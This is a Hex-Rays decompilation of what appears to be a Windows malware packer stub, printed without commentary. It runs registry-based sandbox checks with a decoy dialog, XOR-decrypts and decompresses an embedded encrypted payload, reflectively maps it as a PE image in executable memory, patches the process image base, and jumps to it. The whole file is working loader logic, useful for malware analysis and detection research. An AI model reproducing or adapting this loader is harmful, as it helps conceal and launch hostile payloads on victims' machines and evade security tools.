/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// LSTATUS __stdcall RegOpenKeyA(HKEY hKey, LPCSTR lpSubKey, PHKEY phkResult);
// void __stdcall InitCommonControls();
// HANDLE __stdcall GetProcessHeap();
// LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// BOOL __stdcall VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
// LPVOID __stdcall HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// LPVOID __stdcall MapViewOfFileEx(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap, LPVOID lpBaseAddress);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// HANDLE __stdcall CreateFileMappingA(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName);
// LPSTR __stdcall GetCommandLineA();
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// BOOL __stdcall UnmapViewOfFile(LPCVOID lpBaseAddress);
// INT_PTR __stdcall DialogBoxParamA(HINSTANCE hInstance, LPCSTR lpTemplateName, HWND hWndParent, DLGPROC lpDialogFunc, LPARAM dwInitParam);
// HICON __stdcall LoadIconA(HINSTANCE hInstance, LPCSTR lpIconName);
// HCURSOR __stdcall LoadCursorA(HINSTANCE hInstance, LPCSTR lpCursorName);
int __cdecl sub_401060(int a1, int a2, int a3);
LSTATUS __cdecl sub_4010A0(char *a1, int a2, unsigned int a3);
int __cdecl sub_4011D0(int *a1, char *a2);
INT_PTR __stdcall DialogFunc(HWND, UINT, WPARAM, LPARAM); // idb
// int __usercall start@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>);
int __cdecl sub_401480(int a1, int a2);
FARPROC __cdecl sub_4015D0(HMODULE hModule, LPCSTR lpProcName);
int __stdcall sub_4015F0(int a1);
__int64 __cdecl sub_401930(int a1);
LPVOID __cdecl sub_401960(SIZE_T dwBytes);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_401435; // weak
_DWORD dword_404000[159] =
{
  16464,
  21504,
  -1865196494,
  768,
  8983808,
  16776960,
  9021696,
  0,
  129716480,
  117912072,
  847716146,
  8390407,
  528945408,
  -1275064646,
  -1196893175,
  567102465,
  1944090964,
  1869770784,
  1843946343,
  1851876128,
  553483886,
  1914725730,
  1772715893,
  1329864814,
  1877225811,
  221144420,
  850205453,
  1162888199,
  29692160,
  -707461111,
  146496875,
  234938456,
  42473987,
  840433720,
  8990724,
  512,
  8979336,
  4096,
  129704192,
  70393473,
  112923404,
  838940801,
  852070407,
  852507909,
  -1750197242,
  2032946,
  849940736,
  70396934,
  143401733,
  839321394,
  2695432,
  103941120,
  -2120277207,
  45157,
  599458816,
  590482818,
  210051875,
  2019914798,
  8982900,
  120723036,
  848363649,
  843415820,
  15275782,
  1680760880,
  15230305,
  853803008,
  850984964,
  7635206,
  679944988,
  -1067450304,
  1929012014,
  805319267,
  738727730,
  64,
  517018930,
  824711218,
  889919282,
  1342648928,
  681452340,
  -2113457615,
  129720620,
  271726120,
  129704232,
  671560272,
  680403840,
  672346680,
  855269986,
  847776772,
  840504324,
  810583064,
  853557184,
  846299398,
  -1600286203,
  344065842,
  2023564090,
  1668246629,
  470423090,
  -2130234704,
  297480048,
  843204737,
  850629202,
  2083672658,
  -452967300,
  -922204789,
  -452967229,
  -1593250685,
  13218232,
  1726021577,
  277750672,
  269431500,
  277226440,
  269431476,
  277226412,
  269431484,
  277226436,
  269169344,
  1477807443,
  3523209,
  1351168256,
  -1655137123,
  841007409,
  -2079388668,
  8982948,
  -1576026063,
  -2071539323,
  152,
  8982712,
  -157151488,
  134025414,
  -1871442557,
  1720193344,
  846844549,
  -141878009,
  -2147483454,
  461447936,
  251933188,
  713040640,
  251998728,
  260121346,
  14844176,
  848105728,
  -165671160,
  713040833,
  551911488,
  3219829,
  260046848,
  79375522,
  840857095,
  252275460,
  2027062690,
  965485347,
  -2129955776,
  10753074,
  -1879048190,
  -1874143141,
  -2146499022,
  -343338752,
  453456580,
  -343338751
}; // idb
CHAR SubKey[] = "SOFTWARE\\Classes\\.dddddd"; // idb
CHAR aSoftwareClasse_0[] = "SOFTWARE\\Classes\\.ani"; // idb
int dword_4080D4 = 0; // weak
int dword_4080D8 = 0; // weak
int dword_4080DC = 0; // weak
int dword_4080E0 = 0; // weak
int dword_4080E4 = 0; // weak
int dword_4080E8 = 0; // weak
int dword_4080EC = 0; // weak
int (*dword_4080F0)(void) = NULL; // weak


//----- (00401060) --------------------------------------------------------
int __cdecl sub_401060(int a1, int a2, int a3)
{
  int result; // eax
  int i; // [esp+4h] [ebp-4h]

  for ( i = 0; i < a3; ++i )
  {
    *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2);
    result = i + 1;
  }
  return result;
}

//----- (004010A0) --------------------------------------------------------
LSTATUS __cdecl sub_4010A0(char *a1, int a2, unsigned int a3)
{
  LSTATUS result; // eax
  int v4; // eax
  int v5; // eax
  int v6; // [esp+0h] [ebp-20h] BYREF
  HKEY phkResult; // [esp+4h] [ebp-1Ch] BYREF
  unsigned int i; // [esp+8h] [ebp-18h]
  int v9; // [esp+Ch] [ebp-14h]
  char v10; // [esp+13h] [ebp-Dh]
  unsigned int v11; // [esp+14h] [ebp-Ch] BYREF
  unsigned int v12; // [esp+18h] [ebp-8h]
  char v13; // [esp+1Fh] [ebp-1h]

  result = RegOpenKeyA(HKEY_LOCAL_MACHINE, SubKey, &phkResult);
  if ( result )
  {
    v10 = *a1;
    v12 = 1;
    v9 = 0;
    do
    {
      v13 = a1[v12++];
      if ( v13 == v10 )
      {
        if ( a1[v12] )
        {
          v4 = sub_4011D0((int *)&v11, &a1[v12]);
          v12 += v4;
          v5 = sub_4011D0(&v6, &a1[v12]);
          v12 += v5;
          for ( i = 0; i < v11; ++i )
          {
            *(_BYTE *)(v9 + a2) = *(_BYTE *)(a2 + v9 - v6);
            ++v9;
          }
        }
        else
        {
          *(_BYTE *)(v9 + a2) = v10;
          ++v9;
          ++v12;
        }
      }
      else
      {
        *(_BYTE *)(v9 + a2) = v13;
        ++v9;
      }
      result = v12;
    }
    while ( v12 < a3 );
  }
  return result;
}

//----- (004011D0) --------------------------------------------------------
int __cdecl sub_4011D0(int *a1, char *a2)
{
  int v3; // [esp+0h] [ebp-Ch]
  char v4; // [esp+4h] [ebp-8h]
  int v5; // [esp+8h] [ebp-4h]

  LoadIconA(0, (LPCSTR)0x7F00);
  v5 = 0;
  v3 = 0;
  do
  {
    v4 = *a2++;
    v5 = v4 & 0x7F | (v5 << 7);
    ++v3;
  }
  while ( (v4 & 0x80) != 0 );
  *a1 = v5;
  return v3;
}

//----- (00401280) --------------------------------------------------------
INT_PTR __stdcall DialogFunc(HWND a1, UINT a2, WPARAM a3, LPARAM a4)
{
  return 0;
}

//----- (00401300) --------------------------------------------------------
int __usercall start@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  int result; // eax
  SIZE_T dwBytes; // [esp+14h] [ebp-30h]
  unsigned int v5; // [esp+18h] [ebp-2Ch]
  HKEY phkResult; // [esp+20h] [ebp-24h] BYREF
  char *v7; // [esp+24h] [ebp-20h]
  HINSTANCE hInstance; // [esp+28h] [ebp-1Ch]
  unsigned int i; // [esp+40h] [ebp-4h]
  int savedregs; // [esp+44h] [ebp+0h] BYREF

  i = 0;
  InitCommonControls();
  LoadCursorA(0, (LPCSTR)0x7F00);
  GetCommandLineA();
  hInstance = GetModuleHandleA(0);
  if ( RegOpenKeyA(HKEY_LOCAL_MACHINE, aSoftwareClasse_0, &phkResult) )
  {
    DialogBoxParamA(hInstance, (LPCSTR)0x3E8, 0, DialogFunc, 0);
    result = 0;
  }
  else
  {
    v7 = (char *)dword_404000;
    v5 = dword_404000[0];
    dwBytes = dword_404000[1];
    for ( i = 0; i < v5; i += 8 )
      *(_DWORD *)&v7[i + 8] ^= 0x891100u;
    dword_4080E8 = (int)sub_401960(dwBytes);
    sub_4010A0(v7 + 8, dword_4080E8, v5);
    i = (unsigned int)&loc_401435;
    dword_4080EC = (int)NtCurrentTeb();
    dword_4080DC = a2;
    dword_4080D8 = a3;
    dword_4080E4 = a1;
    dword_4080E0 = (int)&savedregs;
    sub_401480(&loc_401435 - (_UNKNOWN *)hInstance, (int)hInstance);
    sub_4015F0(dword_4080E8);
    result = dword_4080F0();
  }
  return result;
}
// 4080F0: invalid function type has been ignored
// 4080D8: using guessed type int dword_4080D8;
// 4080DC: using guessed type int dword_4080DC;
// 4080E0: using guessed type int dword_4080E0;
// 4080E4: using guessed type int dword_4080E4;
// 4080E8: using guessed type int dword_4080E8;
// 4080EC: using guessed type int dword_4080EC;
// 4080F0: using guessed type int (*dword_4080F0)(void);

//----- (00401480) --------------------------------------------------------
int __cdecl sub_401480(int a1, int a2)
{
  _DWORD *v3; // [esp+Ch] [ebp-18h]
  int v4; // [esp+10h] [ebp-14h]
  SIZE_T *v5; // [esp+14h] [ebp-10h]
  unsigned int v6; // [esp+18h] [ebp-Ch]
  _DWORD *i; // [esp+1Ch] [ebp-8h]
  unsigned int j; // [esp+20h] [ebp-4h]

  v5 = (SIZE_T *)(*(_DWORD *)(a2 + 60) + a2);
  dword_4080D4 = (int)VirtualAlloc(0, v5[20], 0x3000u, 0x40u);
  if ( dword_4080D4 )
  {
    sub_401060(dword_4080D4, a2, v5[20]);
    v4 = dword_4080D4 - a2;
    if ( v5[41] )
    {
      for ( i = (_DWORD *)(v5[40] + a2); i[1]; i = (_DWORD *)((char *)i + i[1]) )
      {
        v6 = (unsigned int)(i[1] - 8) >> 1;
        v3 = i + 2;
        for ( j = 0; j < v6; ++j )
        {
          if ( (int)*((unsigned __int16 *)v3 + j) >> 12 == 3 )
            *(_DWORD *)(*i + dword_4080D4 + (*((_WORD *)v3 + j) & 0xFFF)) += v4;
        }
      }
    }
    __asm { jmp     eax }
  }
  return 0;
}
// 4080D4: using guessed type int dword_4080D4;

//----- (004015D0) --------------------------------------------------------
FARPROC __cdecl sub_4015D0(HMODULE hModule, LPCSTR lpProcName)
{
  return GetProcAddress(hModule, lpProcName);
}

//----- (004015F0) --------------------------------------------------------
int __stdcall sub_4015F0(int a1)
{
  FARPROC v2; // eax
  const CHAR *j; // [esp+0h] [ebp-3Ch]
  int v4; // [esp+10h] [ebp-2Ch]
  char *v5; // [esp+10h] [ebp-2Ch]
  int *v6; // [esp+14h] [ebp-28h]
  const CHAR *v7; // [esp+18h] [ebp-24h]
  _DWORD *v8; // [esp+20h] [ebp-1Ch]
  int *v9; // [esp+24h] [ebp-18h]
  HMODULE hModule; // [esp+2Ch] [ebp-10h]
  int v11; // [esp+30h] [ebp-Ch]
  unsigned int i; // [esp+34h] [ebp-8h]
  HANDLE hFileMappingObject; // [esp+38h] [ebp-4h]

  v4 = *(_DWORD *)(a1 + 60) + a1;
  v8 = (_DWORD *)(v4 + *(unsigned __int16 *)(v4 + 20) + 24);
  v7 = (const CHAR *)VirtualAlloc(0, *(_DWORD *)(v4 + 80), 0x3000u, 0x40u);
  if ( !v7 )
    return 0;
  sub_401060((int)v7, a1, *(_DWORD *)(a1 + 60) + 40 * *(unsigned __int16 *)(v4 + 6) + 312);
  for ( i = 0; i < *(unsigned __int16 *)(v4 + 6); ++i )
  {
    if ( v8[5] )
    {
      if ( v8[4] )
        sub_401060(
          (int)&v7[v8[3]],
          v8[5] + a1,
          *(_DWORD *)(v4 + 60) * ((unsigned int)(v8[4] + *(_DWORD *)(v4 + 60) - 1) / *(_DWORD *)(v4 + 60)));
    }
    v8 += 10;
  }
  v5 = (char *)&v7[*((_DWORD *)v7 + 15)];
  hFileMappingObject = CreateFileMappingA((HANDLE)0xFFFFFFFF, 0, 4u, 0, *((_DWORD *)v5 + 20), 0);
  if ( !hFileMappingObject )
    return 0;
  for ( j = &v7[*((_DWORD *)v5 + 32)]; *((_DWORD *)j + 4); j += 20 )
  {
    hModule = LoadLibraryA(&v7[*((_DWORD *)j + 3)]);
    if ( *(_DWORD *)j )
    {
      v9 = (int *)&v7[*(_DWORD *)j];
      v6 = (int *)&v7[*((_DWORD *)j + 4)];
    }
    else
    {
      v9 = (int *)&v7[*((_DWORD *)j + 4)];
      v6 = (int *)&v7[*(_DWORD *)j];
    }
    v11 = 0;
    if ( *((_DWORD *)j + 4) && *(_DWORD *)j )
      v11 = 1;
    while ( *v9 )
    {
      if ( *v9 >= 0 )
        v2 = sub_4015D0(hModule, &v7[*v9 + 2]);
      else
        v2 = sub_4015D0(hModule, (LPCSTR)(*v9 & 0x7FFFFFFF));
      *v9 = (int)v2;
      if ( !*v9 )
        return 0;
      if ( v11 )
        *v6 = *v9;
      ++v9;
      ++v6;
    }
  }
  dword_4080D4 = (int)MapViewOfFileEx(hFileMappingObject, 0x22u, 0, 0, 0, *((LPVOID *)v5 + 13));
  if ( dword_4080D4 )
    goto LABEL_36;
  if ( !UnmapViewOfFile(*((LPCVOID *)v5 + 13)) && !VirtualFree(*((LPVOID *)v5 + 13), 0, 0x8000u) )
    return 0;
  dword_4080D4 = (int)MapViewOfFileEx(hFileMappingObject, 0x22u, 0, 0, 0, *((LPVOID *)v5 + 13));
  if ( !dword_4080D4 )
  {
    dword_4080D4 = (int)VirtualAlloc(*((LPVOID *)v5 + 13), *((_DWORD *)v5 + 20), 0x3000u, 0x40u);
    if ( !dword_4080D4 )
      return 0;
  }
LABEL_36:
  sub_401060(dword_4080D4, (int)v7, *((_DWORD *)v5 + 20));
  sub_401930(dword_4080D4);
  dword_4080F0 = (int (*)(void))(*((_DWORD *)v5 + 10) + dword_4080D4);
  *((_DWORD *)v5 + 10) = dword_4080F0;
  return 1;
}
// 4080D4: using guessed type int dword_4080D4;
// 4080F0: using guessed type int (*dword_4080F0)(void);

//----- (00401930) --------------------------------------------------------
__int64 __cdecl sub_401930(int a1)
{
  __int64 result; // rax

  result = *(unsigned int *)(dword_4080EC + 48);
  *(_DWORD *)(result + 8) = a1;
  return result;
}
// 4080EC: using guessed type int dword_4080EC;

//----- (00401960) --------------------------------------------------------
LPVOID __cdecl sub_401960(SIZE_T dwBytes)
{
  HANDLE v1; // eax

  v1 = GetProcessHeap();
  return HeapAlloc(v1, 0, dwBytes);
}

// nfuncs=10 queued=10 decompiled=10 lumina nreq=0 worse=0 better=0
// ALL OK, 10 function(s) have been successfully decompiled
